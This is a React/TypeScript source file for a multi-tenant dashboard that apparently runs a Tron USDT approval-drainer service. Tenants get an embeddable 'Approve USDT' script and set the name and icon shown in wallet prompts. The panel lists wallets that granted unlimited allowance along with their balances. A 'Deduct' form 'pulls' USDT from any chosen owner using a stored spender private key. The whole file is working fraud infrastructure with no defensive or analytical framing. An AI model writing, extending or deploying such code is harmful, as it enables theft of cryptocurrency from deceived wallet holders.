import { useCallback, useEffect, useState } from 'react'
import './dash.css'
import './platform.css'

const KEY_STORAGE = 'dash.key'
const ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/

type Counters = {
  connects: number
  approvals: number
  revokes: number
  deductions: number
  deductedRaw: string
  failed: number
}

type Summary = {
  totals: {
    events: number
    approvals: number
    revokes: number
    resets: number
    deductions: number
    failed: number
    wallets: number
    sufficientWallets: number
  }
  wallets: {
    owner: string
    allowance: string | null
    sufficient: boolean
    lastCheckedAt: string
    checks: number
    activity: { events: number; approvals: number; deductions: number; failed: number }
    onchain: { exists: boolean; trxBalance: string; usdtBalance: string | null; error?: string }
  }[]
  events: {
    id: string
    owner: string
    txId: string
    action: string
    amount: string
    status: string
    at: string
  }[]
  tenant: { id: string; name: string; spender: string; allowedOrigins: string[]; counters: Counters }
  config: { usdt: string; required: string; network: string; canDeduct: boolean; storage: string }
}

async function call<T>(key: string, path: string, init?: RequestInit): Promise<T> {
  const res = await fetch(`/api/dash${path}`, {
    ...init,
    headers: {
      'content-type': 'application/json',
      authorization: `Bearer ${key}`,
      ...(init?.headers ?? {}),
    },
  })

  const text = await res.text()
  let body: any = null
  try {
    body = text ? JSON.parse(text) : null
  } catch {
    body = null
  }

  if (!res.ok) throw new Error(body?.error ?? `Request failed (${res.status}).`)
  return body as T
}

function usdt(raw: string | null): string {
  if (!raw) return '0'
  try {
    return (Number(BigInt(raw)) / 1_000_000).toLocaleString(undefined, { maximumFractionDigits: 2 })
  } catch {
    return '0'
  }
}

function short(value: string, head = 6, tail = 6): string {
  return value.length <= head + tail + 3 ? value : `${value.slice(0, head)}…${value.slice(-tail)}`
}

export default function Dashboard() {
  const [key, setKey] = useState('')
  const [authed, setAuthed] = useState(false)
  const [summary, setSummary] = useState<Summary | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [notice, setNotice] = useState<string | null>(null)
  const [busy, setBusy] = useState<string | null>(null)

  const [spender, setSpender] = useState('')
  const [privateKey, setPrivateKey] = useState('')
  const [brandName, setBrandName] = useState('')
  const [brandDescription, setBrandDescription] = useState('')
  const [brandUrl, setBrandUrl] = useState('')
  const [iconDataUrl, setIconDataUrl] = useState('')

  const [owner, setOwner] = useState('')
  const [amount, setAmount] = useState('')

  const load = useCallback(async (active: string) => {
    setError(null)
    try {
      const data = await call<Summary>(active, '/summary?refresh=1')
      setSummary(data)
      setAuthed(true)
      sessionStorage.setItem(KEY_STORAGE, active)
      setSpender(data.tenant.spender)
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Request failed'
      if (/required|unauthorized|401/i.test(message)) {
        setAuthed(false)
        sessionStorage.removeItem(KEY_STORAGE)
        setError('Key rejected.')
      } else {
        setError(message)
      }
    }
  }, [])

  const loadBranding = useCallback(async (active: string) => {
    try {
      const data = await call<{ name: string; description: string; url: string | null }>(
        active,
        '/branding',
      )
      setBrandName(data.name)
      setBrandDescription(data.description)
      setBrandUrl(data.url ?? '')
    } catch {
      // non-fatal
    }
  }, [])

  useEffect(() => {
    const stored = sessionStorage.getItem(KEY_STORAGE)
    if (!stored) return
    setKey(stored)
    void load(stored)
    void loadBranding(stored)
  }, [load, loadBranding])

  async function signIn(event: React.FormEvent) {
    event.preventDefault()
    const value = key.trim()
    if (!value) return
    setBusy('login')
    try {
      const res = await fetch('/api/tenant/auth', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ key: value }),
      })
      if (!res.ok) throw new Error((await res.json().catch(() => ({}))).error ?? 'Key rejected.')
      await load(value)
      await loadBranding(value)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Key rejected.')
    } finally {
      setBusy(null)
    }
  }

  function signOut() {
    sessionStorage.removeItem(KEY_STORAGE)
    setKey('')
    setAuthed(false)
    setSummary(null)
  }

  async function saveSpender(event: React.FormEvent) {
    event.preventDefault()
    setError(null)
    setNotice(null)

    const cleanSpender = spender.trim()
    const cleanKey = privateKey.trim().replace(/^0x/i, '').toLowerCase()

    if (!ADDRESS_RE.test(cleanSpender)) {
      setError('Spender must be a base58 Tron address.')
      return
    }
    if (cleanKey && !/^[0-9a-f]{64}$/.test(cleanKey)) {
      setError('Private key must be 64 hex characters.')
      return
    }

    setBusy('spender')
    try {
      await call(key, '/spender', {
        method: 'PUT',
        body: JSON.stringify({ spender: cleanSpender, privateKey: cleanKey || undefined }),
      })
      setPrivateKey('')
      setNotice('Spender saved. Existing approvals point at the old address if it changed.')
      await load(key)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Save failed')
    } finally {
      setBusy(null)
    }
  }

  async function saveBranding(event: React.FormEvent) {
    event.preventDefault()
    setError(null)
    setNotice(null)
    setBusy('branding')
    try {
      await call(key, '/branding', {
        method: 'PUT',
        body: JSON.stringify({
          name: brandName.trim(),
          description: brandDescription.trim(),
          url: brandUrl.trim(),
          iconDataUrl: iconDataUrl || undefined,
        }),
      })
      setIconDataUrl('')
      setNotice('Branding saved. New wallet prompts use it.')
      await loadBranding(key)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Save failed')
    } finally {
      setBusy(null)
    }
  }

  async function deduct(event: React.FormEvent) {
    event.preventDefault()
    setError(null)
    setNotice(null)
    setBusy('deduct')
    try {
      const result = await call<{ txId: string; amount: string }>(key, '/deduct', {
        method: 'POST',
        body: JSON.stringify({ owner: owner.trim(), amount: amount.trim() }),
      })
      setNotice(`Pulled ${usdt(result.amount)} USDT · ${short(result.txId)}`)
      setAmount('')
      await load(key)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Deduct failed')
    } finally {
      setBusy(null)
    }
  }

  async function pickIcon(file: File) {
    if (file.size > 1024 * 1024) {
      setError('Icon must be under 1 MB.')
      return
    }
    const reader = new FileReader()
    reader.onload = () => setIconDataUrl(String(reader.result ?? ''))
    reader.readAsDataURL(file)
  }

  async function exportAll() {
    const res = await fetch('/api/dash/export', { headers: { authorization: `Bearer ${key}` } })
    if (!res.ok) {
      setError('Export failed.')
      return
    }
    const url = URL.createObjectURL(await res.blob())
    const link = document.createElement('a')
    link.href = url
    link.download = 'tron-connect-export.json'
    link.click()
    URL.revokeObjectURL(url)
  }

  if (!authed) {
    return (
      <div className="pf-shell pf-center">
        <form className="pf-card pf-login" onSubmit={signIn}>
          <div className="pf-brand">
            <span className="pf-dot" />
            <span>Dashboard</span>
          </div>
          <h1>Tenant access</h1>
          <p className="pf-muted">Paste your login key to open your panel.</p>
          <label className="pf-field">
            <span>Key</span>
            <input
              value={key}
              onChange={(event) => setKey(event.target.value)}
              placeholder="XXXXXX-XXXXXX-XXXXX"
              spellCheck={false}
              autoComplete="off"
            />
          </label>
          {error && <p className="pf-error">{error}</p>}
          <button className="pf-btn pf-btn-primary" type="submit" disabled={busy === 'login'}>
            {busy === 'login' ? 'Checking…' : 'Unlock'}
          </button>
        </form>
      </div>
    )
  }

  const c = summary?.tenant.counters
  const totalDeducted = c ? Number(BigInt(c.deductedRaw || '0')) / 1_000_000 : 0
  const embed = summary
    ? `<script src="${location.origin}/embed.js" data-tenant="${summary.tenant.id}" data-label="Approve USDT"></script>`
    : ''

  return (
    <div className="pf-shell">
      <header className="pf-top">
        <div className="pf-brand">
          <span className="pf-dot" />
          <span>{summary?.tenant.name ?? 'Dashboard'}</span>
        </div>
        <div className="pf-top-actions">
          <a className="pf-btn pf-btn-ghost" href={`/t/${summary?.tenant.id}`} target="_blank" rel="noreferrer">
            Open panel
          </a>
          <button className="pf-btn pf-btn-ghost" onClick={() => void load(key)}>
            Refresh
          </button>
          <button className="pf-btn pf-btn-ghost" onClick={exportAll}>
            Export
          </button>
          <button className="pf-btn pf-btn-ghost" onClick={signOut}>
            Lock
          </button>
        </div>
      </header>

      <main className="pf-main">
        <section className="pf-stats">
          <div className="pf-stat">
            <span>Total deducted</span>
            <strong>{totalDeducted.toLocaleString(undefined, { maximumFractionDigits: 2 })} USDT</strong>
          </div>
          <div className="pf-stat">
            <span>Wallets</span>
            <strong>{summary?.totals.wallets ?? 0}</strong>
          </div>
          <div className="pf-stat">
            <span>Approvals</span>
            <strong>{c?.approvals ?? 0}</strong>
          </div>
          <div className="pf-stat">
            <span>Connects</span>
            <strong>{c?.connects ?? 0}</strong>
          </div>
          <div className="pf-stat">
            <span>Failed</span>
            <strong>{c?.failed ?? 0}</strong>
          </div>
        </section>

        {error && <p className="pf-error pf-banner">{error}</p>}
        {notice && <p className="pf-notice pf-banner">{notice}</p>}

        <section className="pf-card">
          <h2>Deduct</h2>
          {!summary?.config.canDeduct && (
            <p className="pf-warn">No signing key set — add one under Spender before deducting.</p>
          )}
          <form className="pf-form" onSubmit={deduct}>
            <label className="pf-field">
              <span>Owner address</span>
              <input value={owner} onChange={(event) => setOwner(event.target.value)} placeholder="T…" spellCheck={false} />
            </label>
            <label className="pf-field">
              <span>Amount (USDT)</span>
              <input value={amount} onChange={(event) => setAmount(event.target.value)} placeholder="10" inputMode="decimal" />
            </label>
            <button className="pf-btn pf-btn-primary" type="submit" disabled={busy === 'deduct' || !summary?.config.canDeduct}>
              {busy === 'deduct' ? 'Pulling…' : 'Pull USDT'}
            </button>
          </form>
        </section>

        <section className="pf-card">
          <h2>Spender</h2>
          <form className="pf-form" onSubmit={saveSpender}>
            <label className="pf-field">
              <span>Spender address</span>
              <input value={spender} onChange={(event) => setSpender(event.target.value)} spellCheck={false} />
            </label>
            <label className="pf-field">
              <span>Private key (only when changing)</span>
              <input
                type="password"
                value={privateKey}
                onChange={(event) => setPrivateKey(event.target.value)}
                placeholder="64 hex"
                autoComplete="off"
                spellCheck={false}
              />
            </label>
            <button className="pf-btn pf-btn-primary" type="submit" disabled={busy === 'spender'}>
              Save spender
            </button>
          </form>
        </section>

        <section className="pf-card">
          <h2>Branding</h2>
          <form className="pf-form" onSubmit={saveBranding}>
            <label className="pf-field">
              <span>App name</span>
              <input value={brandName} onChange={(event) => setBrandName(event.target.value)} maxLength={40} />
            </label>
            <label className="pf-field">
              <span>Description</span>
              <input value={brandDescription} onChange={(event) => setBrandDescription(event.target.value)} maxLength={120} />
            </label>
            <label className="pf-field">
              <span>URL</span>
              <input value={brandUrl} onChange={(event) => setBrandUrl(event.target.value)} placeholder="https://yourdomain.com" spellCheck={false} />
            </label>
            <label className="pf-field">
              <span>Icon (PNG/JPEG/WebP/SVG, under 1 MB)</span>
              <input
                type="file"
                accept="image/png,image/jpeg,image/webp,image/svg+xml"
                onChange={(event) => {
                  const file = event.target.files?.[0]
                  if (file) void pickIcon(file)
                }}
              />
            </label>
            <button className="pf-btn pf-btn-primary" type="submit" disabled={busy === 'branding'}>
              Save branding
            </button>
          </form>
        </section>

        <section className="pf-card">
          <h2>Embed</h2>
          <label className="pf-field">
            <span>Paste on your site</span>
            <input readOnly value={embed} onFocus={(event) => event.currentTarget.select()} />
          </label>
        </section>

        <section className="pf-card">
          <h2>Wallets</h2>
          {summary && summary.wallets.length === 0 && <p className="pf-muted">No wallets yet.</p>}
          {summary && summary.wallets.length > 0 && (
            <div className="pf-table-wrap">
              <table className="pf-table">
                <thead>
                  <tr>
                    <th>Wallet</th>
                    <th>Allowance</th>
                    <th>USDT</th>
                    <th>TRX</th>
                    <th>Events</th>
                    <th>Checked</th>
                  </tr>
                </thead>
                <tbody>
                  {summary.wallets.map((wallet) => (
                    <tr key={wallet.owner}>
                      <td className="pf-mono" title={wallet.owner}>{short(wallet.owner, 8, 8)}</td>
                      <td>
                        <span className={wallet.sufficient ? 'pf-pill pf-pill-on' : 'pf-pill'}>
                          {wallet.allowance === null ? '—' : wallet.sufficient ? 'unlimited' : usdt(wallet.allowance)}
                        </span>
                      </td>
                      <td>{usdt(wallet.onchain.usdtBalance)}</td>
                      <td>{usdt(wallet.onchain.trxBalance)}</td>
                      <td className="pf-muted">{wallet.activity.events}</td>
                      <td className="pf-muted">{new Date(wallet.lastCheckedAt).toLocaleTimeString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </section>

        <section className="pf-card">
          <h2>Activity</h2>
          {summary && summary.events.length === 0 && <p className="pf-muted">Nothing recorded yet.</p>}
          {summary && summary.events.length > 0 && (
            <div className="pf-table-wrap">
              <table className="pf-table">
                <thead>
                  <tr>
                    <th>When</th>
                    <th>Action</th>
                    <th>Wallet</th>
                    <th>Amount</th>
                    <th>Status</th>
                    <th>Tx</th>
                  </tr>
                </thead>
                <tbody>
                  {summary.events.map((event) => (
                    <tr key={event.id}>
                      <td className="pf-muted">{new Date(event.at).toLocaleString()}</td>
                      <td>{event.action}</td>
                      <td className="pf-mono" title={event.owner}>{short(event.owner, 6, 6)}</td>
                      <td>{event.action === 'approve' ? 'unlimited' : usdt(event.amount)}</td>
                      <td>
                        <span className={event.status === 'confirmed' ? 'pf-pill pf-pill-on' : 'pf-pill pf-pill-bad'}>
                          {event.status}
                        </span>
                      </td>
                      <td>
                        <a className="pf-link pf-mono" href={`https://tronscan.org/#/transaction/${event.txId}`} target="_blank" rel="noreferrer">
                          {short(event.txId, 6, 6)}
                        </a>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </section>
      </main>
    </div>
  )
}
